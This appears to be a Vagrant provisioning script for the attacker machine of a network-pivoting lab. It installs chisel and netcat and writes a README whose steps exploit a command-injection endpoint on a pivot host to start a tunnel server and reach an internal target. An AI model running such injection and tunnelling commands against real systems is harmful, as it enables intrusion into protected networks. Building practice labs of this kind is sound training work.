#!/bin/bash
set -e

export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y --no-install-recommends curl wget gzip netcat-openbsd

CHISEL_VERSION="1.8.1"
CHISEL_URL="https://github.com/jpillora/chisel/releases/download/v${CHISEL_VERSION}/chisel_${CHISEL_VERSION}_linux_amd64.gz"
mkdir -p /usr/local/bin
wget -qO- "$CHISEL_URL" | gunzip > /usr/local/bin/chisel
chmod +x /usr/local/bin/chisel

cat > /home/vagrant/README.txt <<'EOF'
Attacker VM
------------
This machine is the entry point for the lab.

From here you can access the pivot host at http://192.168.56.20:5000
and tunnel to the target host through pivot using chisel.

The target host is on a private internetwork only reachable from pivot.

To establish the tunnel from this machine:
  1. Exploit the command injection on pivot to start chisel server:
     curl "http://192.168.56.20:5000/cmd?cmd=/usr/local/bin/chisel%20server%20--port%208080%20&"
  2. Then start the chisel client:
     /usr/local/bin/chisel client 192.168.56.20:8080 5001:192.168.57.30:5000
  3. Access the target:
     curl http://127.0.0.1:5001/login

Run commands like:
  curl http://192.168.56.20:5000/
  curl "http://192.168.56.20:5000/cmd?cmd=hostname"
EOF

chown vagrant:vagrant /home/vagrant/README.txt
